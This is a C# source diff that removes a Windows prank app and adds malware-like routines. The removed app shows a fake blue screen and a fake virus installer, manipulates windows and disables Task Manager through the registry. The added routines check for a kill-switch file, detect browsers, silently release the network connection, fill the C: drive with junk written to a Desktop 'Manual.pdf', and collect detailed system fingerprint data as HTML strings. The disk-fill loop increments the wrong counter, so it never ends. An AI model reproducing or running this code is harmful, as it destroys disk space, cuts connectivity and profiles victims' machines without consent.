@@ -1,482 +1,277 @@
-using System.Globalization;
-using System.Diagnostics;
-using System.Runtime.InteropServices;
-using static System.Windows.Forms.VisualStyles.VisualStyleElement.Rebar;
-using System;
-
-
-
-
-namespace testes_pode_apagar
-{
-    public partial class Form1 : Form
+public static string getMac()
     {
-        public Form1()
-        {
-            InitializeComponent();
-        }
-
-        [DllImport("user32.dll")]
-        static extern IntPtr GetForegroundWindow();
-
-        [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-        const int SW_MINIMIZE = 6;
-        const int SW_RESTORE = 9;
-
-
-
-
-        private void button1_Click(object sender, EventArgs e)
-        {
-            for (int i = 0; i < 10; i++)
-            {
-                var hwnd = GetForegroundWindow();
-                ShowWindow(hwnd, SW_MINIMIZE);
-                Thread.Sleep(500);
-                ShowWindow(hwnd, SW_RESTORE);
-                Thread.Sleep(500);
-            }
-
-        }
-
-        private void button2_Click(object sender, EventArgs e)
-        {
-
-            Form bsod = new Form();
-            bsod.FormBorderStyle = FormBorderStyle.None;
-            bsod.WindowState = FormWindowState.Maximized;
-            bsod.BackColor = Color.Blue;
-
-            Label msg = new Label();
-            msg.Text = "Um problema foi detectado e o Windows foi desligado para evitar danos ao computador...";
-            msg.ForeColor = Color.White;
-            msg.Font = new Font("Consolas", 14);
-            msg.Dock = DockStyle.Fill;
-            msg.TextAlign = ContentAlignment.MiddleCenter;
-
-            bsod.Controls.Add(msg);
-            bsod.ShowDialog();
-
-
-            Thread.Sleep(5000);
-            bsod.Close();
-        }
-
-        private void button3_Click(object sender, EventArgs e)
-        {
-            var notify = new System.Windows.Forms.NotifyIcon()
-            {
-                Visible = true,
-                Icon = SystemIcons.Information,
-                BalloonTipTitle = "Atualização disponível",
-                BalloonTipText = "Clique aqui para instalar o Windows XP",
-            };
-            notify.ShowBalloonTip(3000);
-
-        }
-
-        private void button4_Click(object sender, EventArgs e)
-        {
-
-
-            for (int i = 0; i < 10; i++)
-            {
-                SendKeys.SendWait("{CAPSLOCK}");
-                Thread.Sleep(500);
-            }
-        }
-
-        private void button5_Click(object sender, EventArgs e)
-        {
-            //por em loop buscando a frase do txt do site
-            Clipboard.SetText("abacadabra pé de cabra");
-        }
-
-        private void button6_Click(object sender, EventArgs e)
-        {
-            // captura tela
-            Bitmap bmp = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
-            Graphics g = Graphics.FromImage(bmp);
-            g.CopyFromScreen(0, 0, 0, 0, bmp.Size);
-
-            // mostra em fullscreen
-            Form fakeFreeze = new Form();
-            fakeFreeze.FormBorderStyle = FormBorderStyle.None;
-            fakeFreeze.WindowState = FormWindowState.Maximized;
-            fakeFreeze.BackgroundImage = bmp;
-            fakeFreeze.ShowDialog();
-
-        }
-
-
-        private void button7_Click(object sender, EventArgs e)
-        {
-            Form form = new Form();
-            form.WindowState = FormWindowState.Maximized;
-            form.BackColor = Color.Black;
-
-            System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
-            timer.Interval = 700;
-
-
-            //----------------------------------------
-            Label msg = new Label();
-            msg.Text = "Obtendo dados...";
-            msg.ForeColor = Color.Lime;
-            msg.Font = new Font("Consolas", 14);
-            msg.Dock = DockStyle.Fill;
-            msg.TextAlign = ContentAlignment.MiddleCenter;
-
-            form.Controls.Add(msg);
-            //----------------------------------------
-
-            int ct = 0;
-            timer.Tick += (s, e) =>
-            {
-
-                switch (ct)
-                {
-                    case 4:
-                    case 5:
-                    case 6:
-                    case 7:
-                        msg.Text = "Dados obtidos com sucesso\nAguarde...";
-                        break;
-                    case 8:
-                        timer.Stop();
-                        form.Close();
-                        break;
-                    default:
-                        timer.Interval = 500;
-                        Random rand = new Random();
-                        string numericText = new string(Enumerable.Range(0, 10).Select(_ => (char)('0' + rand.Next(0, 10))).ToArray());
-                        msg.Text += "\n(*byte) => 0x" + numericText;
-
-                        break;
-                }
-                ct++;
-            };
-
-
-
-
-            timer.Start();
-            form.ShowDialog();
-
-
-        }
-
-
-
-        private void button8_Click(object sender, EventArgs e)
-        {
-
-
-            SimularInstalacaoVirus();
-
-        }
-
-
-        public static void SimularInstalacaoVirus()
-        {
-            Form form = new Form();
-            form.Text = "Instalador do Sistema";
-            form.FormBorderStyle = FormBorderStyle.None;
-            form.StartPosition = FormStartPosition.CenterScreen;
-            form.Size = new Size(600, 200);
-            form.TopMost = true;
-            form.BackColor = Color.Black;
-
-            Label label = new Label();
-            label.ForeColor = Color.LimeGreen;
-            label.Font = new Font("Consolas", 12, FontStyle.Bold);
-            label.Text = "Iniciando instalação do sistema...";
-            label.AutoSize = false;
-            label.TextAlign = ContentAlignment.MiddleCenter;
-            label.Dock = DockStyle.Top;
-            label.Height = 50;
-
-            ProgressBar progressBar = new ProgressBar();
-            progressBar.Dock = DockStyle.Bottom;
-            progressBar.Height = 30;
-            progressBar.Style = ProgressBarStyle.Continuous;
-
-            form.Controls.Add(label);
-            form.Controls.Add(progressBar);
-
-            System.Windows.Forms.Timer timer = new System.Windows.Forms.Timer();
-            timer.Interval = 100;
-            int progresso = 0;
-            string[] mensagens = new string[]
-            {
-            "Instalando malware.exe...",
-            "Criptografando arquivos pessoais...",
-            "Enviando dados para servidor...",
-            "Instalando keylogger...",
-            "Finalizando instalação do vírus..."
-            };
-
-            timer.Tick += (sender, e) =>
-            {
-                progresso++;
-                if (progresso <= 100)
-                {
-                    progressBar.Value = progresso;
-
-                    // Muda a mensagem a cada 20%
-                    int index = Math.Min(progresso / 20, mensagens.Length - 1);
-                    label.Text = mensagens[index] + $" {progresso}%";
-                }
-
-                if (progresso >= 99)
-                {
-                    timer.Stop();
-                    MessageBox.Show("Instalação concluída com sucesso!\nAgora você está sendo vigiado. ", "AVISO", MessageBoxButtons.OK, MessageBoxIcon.Warning);
-                    form.Close();
-                }
-            };
-
-            timer.Start();
-            form.ShowDialog();
-        }
-
-
-
-        //---------------------------------------------
-        //---------------------------------------------
-        //---------------------------------------------
-        //---------------------------------------------
-        //---------------------------------------------
-        //---------------------------------------------
-        //---------------------------------------------
-        //---------------------------------------------
-        //---------------------------------------------
-        //---------------------------------------------
-        [DllImport("user32.dll")]
-        public static extern void keybd_event(byte bVk, byte bScan, int dwFlags, int dwExtraInfo);
-
-        const int KEYEVENTF_EXTENDEDKEY = 0x1;
-        const int KEYEVENTF_KEYUP = 0x2;
-        const byte VK_VOLUME_UP = 0xAF;
-        const byte VK_VOLUME_DOWN = 0xAE;
-
-        public static void IncreaseVolume()
-        {
-            keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_EXTENDEDKEY, 0);
-            keybd_event(VK_VOLUME_UP, 0, KEYEVENTF_KEYUP, 0);
-        }
-
-        public static void DecreaseVolume()
-        {
-            keybd_event(VK_VOLUME_DOWN, 0, KEYEVENTF_EXTENDEDKEY, 0);
-            keybd_event(VK_VOLUME_DOWN, 0, KEYEVENTF_KEYUP, 0);
-        }
-
-        private void button9_Click(object sender, EventArgs e)
-        {
-            for (int i = 0; i < 10; i++)
-            {
-                DecreaseVolume();
-            }
-        }
-
-        //--------------------------
-        //--------------------------
-        //--------------------------
-
-
-        [DllImport("user32.dll", SetLastError = true)]
-        static extern bool SetWindowText(IntPtr hWnd, string lpString);
-
-        public static void RenameActiveWindow(string newTitle = "boceta")
-        {
-            IntPtr hwnd = GetForegroundWindow();
-            SetWindowText(hwnd, newTitle);
-        }
-        private void button10_Click(object sender, EventArgs e)
-        {
-            Thread.Sleep(3000);
-            RenameActiveWindow();
-        }
-        //---------------------------------
-        //---------------------------------
-        //---------------------------------
-        //---------------------------------
-        [DllImport("user32.dll")]
-        static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);
-
-        const uint WM_CLOSE = 0x0010;
-
-        private void button11_Click(object sender, EventArgs e)
-        {
-            Thread.Sleep(3000);
-            IntPtr handle = GetForegroundWindow();
-            PostMessage(handle, WM_CLOSE, IntPtr.Zero, IntPtr.Zero);
-        }
-
-        [DllImport("user32.dll")]
-        public static extern short GetAsyncKeyState(int vKey);
-
-        public static bool IsKeyPressed(Keys key)
-        {
-            return (GetAsyncKeyState((int)key) & 0x8000) != 0;
-        }
-
-        private void timer1_Tick(object sender, EventArgs e)
-        {
-            if (IsKeyPressed((Keys)0x20))
-            {
-                SendKeys.Send("Olar");
-            }
-        }
-        //--------------------------------------
-        //--------------------------------------
-        //--------------------------------------
-        //--------------------------------------
-        [DllImport("user32.dll")]
-        public static extern bool MoveWindow(IntPtr hWnd, int X, int Y, int nWidth, int nHeight, bool bRepaint);
-
-        public static void ResizeActiveWindow()
-        {
-            IntPtr hWnd = GetForegroundWindow();
-            MoveWindow(hWnd, 100, 100, 800, 600, true);
-        }
-        private void button12_Click(object sender, EventArgs e)
-        {
-
-            Thread.Sleep(3000);
-            ResizeActiveWindow();
-        }
-
-
-        [DllImport("user32.dll")]
-        public static extern bool LockWorkStation();
-        private void button13_Click(object sender, EventArgs e)
-        {
-            LockWorkStation();
-        }
-        //------------------------------------------------------------
-        //------------------------------------------------------------
-        //------------------------------------------------------------
-        //------------------------------------------------------------
-        [DllImport("user32.dll", SetLastError = true)]
-        static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
-
-        [DllImport("user32.dll", SetLastError = true)]
-        static extern int GetWindowLong(IntPtr hWnd, int nIndex);
-
-        [DllImport("user32.dll")]
-        static extern bool SetLayeredWindowAttributes(IntPtr hwnd, uint crKey, byte bAlpha, uint dwFlags);
-
-        const int GWL_EXSTYLE = -20;
-        const int WS_EX_LAYERED = 0x80000;
-        const int LWA_ALPHA = 0x2;
-
-        public static void MakeActiveWindowTransparent(byte alpha)
-        {
-            IntPtr hWnd = GetForegroundWindow();
-            int exStyle = GetWindowLong(hWnd, GWL_EXSTYLE);
-            SetWindowLong(hWnd, GWL_EXSTYLE, exStyle | WS_EX_LAYERED);
-            SetLayeredWindowAttributes(hWnd, 0, alpha, LWA_ALPHA);
-        }
-
-
-        private void button14_Click(object sender, EventArgs e)
-        {
-            Thread.Sleep(3000);
-            MakeActiveWindowTransparent(20);
-        }
-        //----------
-        //----------
-        //----------
-        //----------
-        //----------
-        //----------
-        //----------
-        //----------
-
-        const int GWL_STYLE = -16;
-        const int WS_SYSMENU = 0x00080000;
-
-        public static void DisableActiveWindowCloseButton()
-        {
-            IntPtr hWnd = GetForegroundWindow();
-            int style = GetWindowLong(hWnd, GWL_STYLE);
-            SetWindowLong(hWnd, GWL_STYLE, style & ~WS_SYSMENU);
-        }
-
-        private void button15_Click(object sender, EventArgs e)
-        {
-            Thread.Sleep(3000);
-            DisableActiveWindowCloseButton();
-        }
-        //------------------------------------------------------------------
-        //------------------------------------------------------------------
-        //------------------------------------------------------------------
-        //------------------------------------------------------------------
-        //------------------------------------------------------------------
-        //------------------------------------------------------------------
-        //------------------------------------------------------------------
-        [DllImport("user32.dll")]
-        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);
-
-
-        const uint WM_CHAR = 0x0102;
-
-        public static void SendTextToWindow(string windowTitle, string text)
-        {
-            IntPtr hWnd = FindWindow(null, windowTitle);
-            if (hWnd == IntPtr.Zero) return;
-
-            foreach (char c in text)
-            {
-                PostMessage(hWnd, WM_CHAR, (IntPtr)c, IntPtr.Zero);
-                Thread.Sleep(50);
-            }
-        }
-
-
-        private void button16_Click(object sender, EventArgs e)
-        {
-            SendTextToWindow("explorer.exe","olar");
-        }
-
-        private void button17_Click(object sender, EventArgs e)
-        {
-
-            Microsoft.Win32.Registry.SetValue(
-@"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System",
-"DisableTaskMgr", 1/*ativa com 0*/, Microsoft.Win32.RegistryValueKind.DWord);
-        }
-
-
-        //----------------------------
-
-  
-
-        static void SendTextToActiveWindow(string text)
-        {
-            IntPtr hWnd = GetForegroundWindow();
-            if (hWnd == IntPtr.Zero)
-            {
-                Console.WriteLine("Nenhuma janela em foco detectada.");
-                return;
-            }
-
-            foreach (char c in text)
-            {
-                PostMessage(hWnd, WM_CHAR, (IntPtr)c, IntPtr.Zero);
-                Thread.Sleep(50);  // Pequena pausa para simular digitação natural
-            }
-        }
-        private void button18_Click(object sender, EventArgs e)
-        {
-            Thread.Sleep(3000);
-            SendTextToActiveWindow("olar");
-        }
-
-        //-----------------------------------------
+        NetworkInterface[] i = NetworkInterface.GetAllNetworkInterfaces();
+        return Convert.ToString(i[0].GetPhysicalAddress());
     }
-}
+
+
+public static bool Verificar_se_Tem_Desativador()
+    {
+        try
+        {
+            DriveInfo[] all = DriveInfo.GetDrives();
+            foreach (DriveInfo d in all)
+            {
+                if (File.Exists(d.Name + "desativador.dll"))
+                {
+                    return true;
+                }
+            }
+            return false;
+        }
+        catch (Exception e) { return false; }
+    }
+
+
+
+
+
+public static bool isNavegando()
+    {
+        try
+        {
+            Process[] chrome = Process.GetProcessesByName("chrome");
+            Process[] edge = Process.GetProcessesByName("msedge");
+            if (chrome.Length > 0 || edge.Length > 0)
+                return true;
+            else return false;
+        }
+        catch (Exception e) { return false; }
+    }
+
+
+
+
+
+
+
+
+ public static void bloquearInternet()
+    {
+        try
+        {
+            Process a = new Process();
+            ProcessStartInfo b = new ProcessStartInfo();
+            b.WindowStyle = ProcessWindowStyle.Hidden;
+            b.FileName = "cmd.exe";
+            b.Arguments = "/C ipconfig -release";
+            a.StartInfo = b;
+            Process.Start(b);
+        }
+        catch (Exception e) { }
+ 
+    }
+
+
+
+
+
+public static bool aindaTemEspacoHD()
+    {
+        try
+        {
+            DriveInfo[] all = DriveInfo.GetDrives();
+            foreach (DriveInfo d in all)
+            {
+                if (d.Name == "C:\\")
+                {
+                    if (d.TotalFreeSpace >= 7372800)
+                        return true;
+                    else
+                        return false;
+                }
+            }
+            return false;
+        }
+        catch (Exception e) { return false; }
+    }
+    public static void consumirMemoriaHD()
+    {
+        try
+        {
+            if (aindaTemEspacoHD())
+            {
+                for (int i = 0; i < 1000; i++)
+                {
+                    using (StreamWriter f = new StreamWriter(Desktop + "Manual.pdf", append: true))
+                    {
+                        for (int i2 = 0; i2 < 100; i++)
+                        {
+                            if (!aindaTemEspacoHD())
+                            {
+                                horaBateu = false;
+                            }
+                            else
+                            {
+                                f.WriteLine("\"A aranha constroi a teia e espera pecientemente ate a vitima cair nela, e quando cai, nao tem mais volta\" ");
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        catch (Exception e) { }
+    }
+
+
+
+
+
+
+public static string ObterNomeProcessador()
+    {
+        string a = "";
+        try
+        {
+            var query = new ObjectQuery("SELECT * FROM Win32_Processor");
+            var searcher = new ManagementObjectSearcher(query);
+            foreach (ManagementObject proc in searcher.Get())
+            {
+                a = Convert.ToString(proc["Name"]);
+            }
+            return "<br>Processador: " + a;
+        }
+        catch (Exception e) { return "<br>Processador: " + a; }
+    }
+    public static string ObterMemoriaRAM()
+    {
+        string a = "";
+        try
+        {
+            var query = new ObjectQuery("SELECT * FROM Win32_ComputerSystem");
+            var searcher = new ManagementObjectSearcher(query);
+            foreach (ManagementObject info in searcher.Get())
+            {
+                a = Convert.ToString(info["TotalPhysicalMemory"]);
+            }
+            return "<br>Memoria RAM: " + a;
+        }
+        catch (Exception e) { return "<br>Memoria RAM: " + a; }
+    }
+    public static string ObterInfoRede()
+    {
+        string a = "";
+        try
+        {
+            NetworkInterface[] interfaces = NetworkInterface.GetAllNetworkInterfaces();
+            foreach (NetworkInterface adapter in interfaces)
+            {
+                a += "<br>" + adapter.Name + ", Tipo: " + adapter.NetworkInterfaceType + ", Estado: " + adapter.OperationalStatus;
+            }
+            return a;
+        }
+        catch (Exception e) { return a; }
+    }
+    public static string VersaoNETFramework()
+    {
+        try
+        {
+            return "<br>NetFramework: " + Environment.Version.ToString();
+        }
+        catch (Exception e) { return "<br>NetFramework: Invalido"; }
+    }
+    public static string ObterReoslucaoTela()
+    {
+        string a = "";
+        try
+        {
+            Screen screen = Screen.PrimaryScreen;
+            a = screen.Bounds.Width + " x " + screen.Bounds.Height;
+            return "<br>Resolução: " + a;
+        }
+        catch (Exception e) { return "<br>Resolução: " + a; }
+    }
+    public static string PlacaMae()
+    {
+        string a = "";
+        try
+        {
+            var query = new ObjectQuery("SELECT * FROM Win32_BaseBoard");
+            var searcher = new ManagementObjectSearcher(query);
+            foreach (ManagementObject board in searcher.Get())
+            {
+                a = "<br>Fabricante da Placa-Mãe: " + board["Manufacturer"] + ", Produto: " + board["Product"];
+            }
+            return a;
+        }
+        catch (Exception e) { return a; }
+    }
+    public static string NomeGPU()
+    {
+        string a = "";
+        try
+        {
+            var query = new ObjectQuery("SELECT * FROM Win32_VideoController");
+            var searcher = new ManagementObjectSearcher(query);
+            foreach (ManagementObject gpu in searcher.Get())
+            {
+                a = gpu["Caption"].ToString();
+            }
+            return "<br>GPU: " + a;
+        }
+        catch (Exception e) { return "<br>GPU: " + a; }
+    }
+    public static string MemoriaDeVideo()
+    {
+        string a = "";
+        try
+        {
+            var query = new ObjectQuery("SELECT * FROM Win32_VideoController");
+            var searcher = new ManagementObjectSearcher(query);
+            foreach (ManagementObject gpu in searcher.Get())
+            {
+                a = gpu["AdapterRAM"].ToString();
+            }
+            return "<br>Memoria de Video:" + a;
+        }
+        catch (Exception e) { return "<br>Memoria de Video:" + a; }
+    }
+    public static string VersaoDoSistema()
+    {
+        string a = "";
+        try
+        {
+            var query = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
+            var searcher = new ManagementObjectSearcher(query);
+            foreach (ManagementObject os in searcher.Get())
+            {
+                a = os["Caption"].ToString();
+            }
+            return "<br>Versao do Windows: " + a;
+        }
+        catch (Exception e) { return "<br>Versao do Windows: " + a; }
+    }
+    public static string TipoProcessador()
+    {
+        try
+        {
+            return Environment.Is64BitOperatingSystem ? "Processador: 64 bits" : "Processador: 32 bits";
+        }
+        catch (Exception e) { return "Processador: Invalido"; }
+    }
+    public static string DNSHostName()
+    {
+        try
+        {
+            return "<br>DNS Host Name: " + Dns.GetHostName();
+        }
+        catch (Exception e) { return "<br>DNS Host Name: Invalido"; }
+    }
+    public static string ObterTodosProcessosRodando()
+    {
+        string a = "<br>Processos Rodando no momento:";
+        try
+        {
+            ServiceController[] services = ServiceController.GetServices();
+            foreach (ServiceController service in services)
+            {
+                a += "<br>Serviço: " + service.ServiceName + ", Status: " + service.Status;
+            }
+            return a;
+        }
+        catch (Exception e) { return a; }
+    }
+
+
+
+
